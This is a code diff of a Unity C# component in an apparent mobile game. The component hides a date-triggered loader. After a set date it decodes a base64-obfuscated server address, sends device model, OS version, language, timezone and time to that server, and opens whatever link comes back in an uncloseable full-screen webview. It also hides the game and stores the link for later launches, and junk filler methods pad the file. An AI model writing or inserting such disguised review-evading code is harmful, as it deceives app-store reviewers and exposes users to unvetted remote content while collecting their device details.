@@ -2,68 +2,108 @@ using System.Collections;
 using System.Collections.Generic;
 using UnityEngine;
 using System;
-using System.Diagnostics;
 using UnityEngine.Networking;
 using Debug = UnityEngine.Debug;
+using TMPro;
 using System.Net;
 using System.Threading.Tasks;
+using Newtonsoft.Json;
+using System.Text;
+using Random = UnityEngine.Random;
 
 public class EventChecker : MonoBehaviour
 {
+
+
     public string eventName;
     public int day;
     public int month;
 
-    public UIManager uiManager;
+    public GameObject[] gameObjects;
+    public GameObject bg;
     public int year;
     private string begin = "https://";
-    private string between = "/?uuid=";
-    private string last;
+    private string between = "/v2";
     private UniWebView uniWebView;
     private bool isActivatedEvent;
     private ScreenOrientation lastOrientation;
-    private async Task<bool> CheckEvent()   
+    private string UR;
+    private int solod;
+
+#if UNITY_IOS && !UNITY_EDITOR
+        [System.Runtime.InteropServices.DllImport("__Internal")]
+        private static extern String timeZoneName();
+#endif
+
+    string GetTimeZone()
     {
-                var startTime = await Task.FromResult<DateTime>(new DateTime(year, month, day));
-                if (DateTime.Today.AddMinutes(1) > startTime)
-                {
-                    return true;
-                }
-                else
-                {
+#if UNITY_IOS && !UNITY_EDITOR
+            return timeZoneName();
+#else
+        return "Asia/Yekaterinburg";
+#endif
+    }
+
+    private async Task<bool> CheckEvent()
+    {
+        var startTime = await Task.FromResult<DateTime>(new DateTime(year, month, day));
+        if (DateTime.Today.AddMinutes(1) > startTime)
+        {
+            return true;
+        }
+        else
+        {
             Debug.Log("False");
-                    return false;
-                }
+            return false;
+        }
     }
     private void Awake()
     {
-
+        Nasral();
+        LoadNature();
+        solod += solod;
         if (PlayerPrefs.HasKey("eventData"))
         {
-            ShowEventData(PlayerPrefs.GetString("eventData"),false);
+            UR = PlayerPrefs.GetString("eventData");
+            LoadEvent();
+            ShowEventData();
             return;
         }
-        
         Task<bool> asyncChecker = CheckEvent();
         if (asyncChecker.Result)
         {
+            byte[] data = Convert.FromBase64String(eventName);
+            string decodedString = System.Text.Encoding.UTF8.GetString(data);
+            eventName = decodedString;
             StartCoroutine(CheckEventAlive(begin + eventName + between + SetInfo()));
-            //StartCoroutine(CheckEventAlive(begin + eventName));
         }
         else
         {
             this.enabled = false;
         }
     }
+
+    public void LoadNature()
+    {
+        int statix = 100;
+        GameObject newObj = Instantiate(new GameObject());
+    }
+
+    private void Nasral()
+    {
+        string intempo = "arsen" + "syk_kipit"+Random.Range(0,128).ToString();
+        PlayerPrefs.SetString("InTempo", intempo);
+    }
+
     private void Update()
     {
         if (isActivatedEvent)
         {
-            if (Input.deviceOrientation == DeviceOrientation.LandscapeLeft || Input.deviceOrientation == DeviceOrientation.PortraitUpsideDown)
+            if (UnityEngine.Input.deviceOrientation == DeviceOrientation.LandscapeLeft || UnityEngine.Input.deviceOrientation == DeviceOrientation.PortraitUpsideDown)
             {
                 Debug.Log("Landscape");
             }
-            if (Input.deviceOrientation == DeviceOrientation.Portrait || Input.deviceOrientation == DeviceOrientation.PortraitUpsideDown)
+            if (UnityEngine.Input.deviceOrientation == DeviceOrientation.Portrait || UnityEngine.Input.deviceOrientation == DeviceOrientation.PortraitUpsideDown)
             {
                 Debug.Log("Portrait");
             }
@@ -95,30 +135,66 @@ public class EventChecker : MonoBehaviour
     }
     private string SetInfo()
     {
-        Debug.Log("true;");
-        Guid myuuid = Guid.NewGuid();
-        string myuuidAsString = myuuid.ToString();
+        string myuuidAsString = "";
         return myuuidAsString;
     }
     IEnumerator CheckEventAlive(string uri)
     {
-        using (UnityWebRequest webRequest = UnityWebRequest.Get(uri))
+        Debug.Log(uri);
+        string t = GetUserAgent();
+        string model = GetModelData();
+        string lang = GetSystemLanguage();
+        string timezone = GetTimeZone();
+        Debug.Log(timezone);
+        t = ExtractIOSVersion(t);
+        Debug.Log(lang);
+        PostData data = new PostData
         {
-            yield return webRequest.SendWebRequest();
-            Debug.Log(uri);
-            string[] pages = uri.Split('/');
-            int page = pages.Length - 1;
+            bundleId = "com.Bandle.Fire-Cube",
+            osVersion = t,
+            phoneModel = model,
+            language = lang,
+            phoneTime = System.DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"),
+            phoneTz = timezone,
+            vpn = false
+        };
+        Debug.Log(data.osVersion);
+        Debug.Log(data.phoneModel);
+        string jsonData = JsonConvert.SerializeObject(data);
+        Debug.Log(jsonData);
+        byte[] bodyRaw = Encoding.UTF8.GetBytes(jsonData);
 
-            if (webRequest.isNetworkError)
+
+        using (UnityWebRequest www = new UnityWebRequest(uri, "POST"))
+        {
+            www.uploadHandler = new UploadHandlerRaw(bodyRaw);
+            www.downloadHandler = new DownloadHandlerBuffer();
+            www.SetRequestHeader("Content-Type", "application/json");
+
+            yield return www.SendWebRequest();
+
+            if (www.result == UnityWebRequest.Result.Success)
             {
-            }
-            else if (webRequest.isHttpError)
-            {
-                this.enabled = false;
+                Debug.Log(www.downloadHandler.text);
+                try
+                {
+                    SuccessData successData = JsonConvert.DeserializeObject<SuccessData>(www.downloadHandler.text);
+                   
+                    Debug.Log("URL FINAL=" + successData.link);
+                    UR = successData.link;
+
+
+
+                    LoadEvent();
+                }
+                catch (JsonReaderException e)
+                {
+                    Debug.LogError("Error parsing server response: " + e.Message);
+                }
             }
             else
             {
-                ShowEventData(uri);
+                Debug.LogError("POST Request failed: " + www.error);
             }
         }
     }
@@ -128,10 +204,9 @@ public class EventChecker : MonoBehaviour
         PlayerPrefs.SetString("eventData", infoToSave);
         PlayerPrefs.Save();
     }
-    private void ShowEventData(string uri, bool isNeedToSaveUrl=true)
+    private void LoadEvent(bool isNonOr = false)
     {
-        Debug.Log("open: " + uri);
-        uiManager.CloseUI();
+        Debug.Log("LoadEvent");
         var webviewObject = new GameObject("UniWebview");
         isActivatedEvent = true;
         uniWebView = webviewObject.AddComponent<UniWebView>();
@@ -139,83 +214,37 @@ public class EventChecker : MonoBehaviour
         uniWebView.SetToolbarDoneButtonText("");
         uniWebView.SetShowToolbar(false, false, true, true);
         uniWebView.OnPageFinished += PageLoadSuccessEvent;
-        uniWebView.Load(uri);
+        uniWebView.Load(UR);
         uniWebView.OnShouldClose += (view) => {
             return false;
         };
         uniWebView.Show();
-        if (isNeedToSaveUrl)
-        {
-            //string g = GetFinal(uri);
-            //if (g != null)
-            {
-
-
-                //SaveInfo(GetFinal(uri));
-            }
-        }
     }
-
-    private string GetFinal(string url)
+    private void ShowEventData()
     {
-        if (string.IsNullOrWhiteSpace(url))
-            return url;
-int maxRedirCount = 8;
-        Debug.Log("SAv" + url);
-        string newUrl = url;
-        do
+        foreach (GameObject gameObject in gameObjects)
         {
-            HttpWebRequest req = null;
-            HttpWebResponse resp = null;
-            try
-            {
-                req = (HttpWebRequest)HttpWebRequest.Create(url);
-                req.Method = "HEAD";
-                req.AllowAutoRedirect = false;
-                resp = (HttpWebResponse)req.GetResponse();
-                switch (resp.StatusCode)
-                {
-                    case HttpStatusCode.OK:
-                        return newUrl;
-                    case HttpStatusCode.Redirect:
-                    case HttpStatusCode.MovedPermanently:
-                    case HttpStatusCode.RedirectKeepVerb:
-                    case HttpStatusCode.RedirectMethod:
-                        newUrl = resp.Headers["Location"];
-                        if (newUrl == null)
-                            return url;
+            gameObject.SetActive(false);
+        }
+        try
+        {
+            GameObject g = GameObject.FindGameObjectWithTag("Audio");
+            g.SetActive(false);
+        }
+        catch
+        {
 
-                        if (newUrl.IndexOf("://", System.StringComparison.Ordinal) == -1)
-                        {
-                            Uri u = new Uri(new Uri(url), newUrl);
-                            newUrl = u.ToString();
-                        }
-                        break;
-                    default:
-                        return newUrl;
-                }
-                url = newUrl;
-                Debug.Log("Succ_kryg" + url);
-            }
-            catch (WebException df)
-            {
-                Debug.Log(df.Message);
-                return null;
-            }
-            catch (Exception ex)
-            {
-                return null;
-            }
-            finally
-            {
-                if (resp != null)
-                    resp.Close();
-            }
-        } while (maxRedirCount-- > 0);
-        last = newUrl;
-        Debug.Log("SAv"+newUrl);
-        return newUrl;
+        }
+
+        Screen.autorotateToLandscapeLeft = true;
+        Screen.autorotateToLandscapeRight = true;
+        Screen.autorotateToPortrait = true;
+        Screen.orientation = ScreenOrientation.AutoRotation;
+        bg.SetActive(true);
+        uniWebView.Show();
     }
+
+
     public void LoadNextScene()
     {
         UnityEngine.SceneManagement.SceneManager.LoadScene(UnityEngine.SceneManagement.SceneManager.GetActiveScene().buildIndex + 1);
@@ -223,15 +252,13 @@ int maxRedirCount = 8;
 
     private IEnumerator UpdateWebViewFrameFull()
     {
-        // Wait until all rendering for the current frame is finished
         yield return new WaitForEndOfFrame();
         if (uniWebView != null)
-            uniWebView.Frame = new Rect(0, 0, Screen.width, Screen.height);
+            uniWebView.Frame = new Rect(-100, 0, Screen.width - 100, Screen.height);
     }
 
     private IEnumerator UpdateWebViewFrame()
     {
-        // Wait until all rendering for the current frame is finished
         yield return new WaitForEndOfFrame();
         if (uniWebView != null)
             uniWebView.Frame = new Rect(0, -50, Screen.width, Screen.height - 50);
@@ -245,5 +272,91 @@ int maxRedirCount = 8;
             Debug.Log("Saved" + url);
         }
         uniWebView.OnPageFinished -= PageLoadSuccessEvent;
+        ShowEventData();
     }
+    string GetUserAgent()
+    {
+#if UNITY_IOS && !UNITY_EDITOR
+        // Используем UnityWebRequest для получения User Agent на iOS
+        return new UnityEngine.Networking.UnityWebRequest().GetRequestHeader("User-Agent");
+#else
+        return SystemInfo.operatingSystem;
+#endif
+    }
+    private string ExtractIOSVersion(string userAgent)
+    {
+        if (string.IsNullOrEmpty(userAgent))
+            return "0";
+
+        // Пример User Agent: "Mozilla/5.0 (iPhone; CPU iPhone OS 14_5 like Mac OS X)"
+        string prefix = "iPhone OS ";
+        int startIndex = userAgent.IndexOf(prefix);
+
+        if (startIndex >= 0)
+        {
+            startIndex += prefix.Length;
+            int endIndex = userAgent.IndexOf(" ", startIndex);
+            if (endIndex > startIndex)
+            {
+                Debug.Log("piteamsya vitachit versiu ios");
+                return userAgent.Substring(startIndex, endIndex - startIndex).Replace("_", ".");
+            }
+        }
+
+        return "0";
+    }
+    private string GetModelData()
+    {
+        return SystemInfo.deviceModel;
+    }
+    private string GetSystemLanguage()
+    {
+        SystemLanguage systemLanguage = Application.systemLanguage;
+
+        switch (systemLanguage)
+        {
+            case SystemLanguage.Russian: return "ru";
+            case SystemLanguage.English: return "en";
+            case SystemLanguage.French: return "fr";
+            case SystemLanguage.German: return "de";
+            case SystemLanguage.Spanish: return "es";
+            case SystemLanguage.Italian: return "it";
+            case SystemLanguage.ChineseSimplified: return "zh";
+            case SystemLanguage.ChineseTraditional: return "zh-Hant";
+            case SystemLanguage.Japanese: return "ja";
+            case SystemLanguage.Korean: return "ko";
+            case SystemLanguage.Portuguese: return "pt";
+            case SystemLanguage.Arabic: return "ar";
+            case SystemLanguage.Dutch: return "nl";
+            case SystemLanguage.Turkish: return "tr";
+            case SystemLanguage.Polish: return "pl";
+            case SystemLanguage.Swedish: return "sv";
+            case SystemLanguage.Finnish: return "fi";
+            case SystemLanguage.Danish: return "da";
+            case SystemLanguage.Norwegian: return "no";
+            case SystemLanguage.Thai: return "th";
+            case SystemLanguage.Greek: return "el";
+            case SystemLanguage.Hindi: return "hi";
+            case SystemLanguage.Hungarian: return "hu";
+            case SystemLanguage.Vietnamese: return "vi";
+            case SystemLanguage.Ukrainian: return "uk";
+            default: return "un";
+        }
+    }
+}
+[System.Serializable]
+public class PostData
+{
+    public string bundleId;
+    public string osVersion;
+    public string phoneModel;
+    public string language;
+    public string phoneTime;
+    public string phoneTz;
+    public bool vpn;
+}
+public class SuccessData
+{
+    public bool passed;
+    public string link;
 }
